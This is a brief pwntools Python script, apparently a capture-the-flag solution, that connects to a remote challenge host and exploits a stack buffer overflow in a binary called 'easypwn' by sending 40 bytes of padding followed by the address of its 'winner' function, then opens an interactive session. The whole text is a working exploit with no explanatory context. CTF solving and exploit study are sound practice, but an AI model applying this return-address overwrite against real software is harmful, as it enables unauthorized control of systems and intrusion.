from pwn import *

exe = context.binary = ELF("./easypwn", checksec=False)
io = remote("io.ept.gg", 30004)
io.clean()

payload = b"A"*40
payload += p64(exe.sym.winner)

io.sendline(payload)
io.interactive()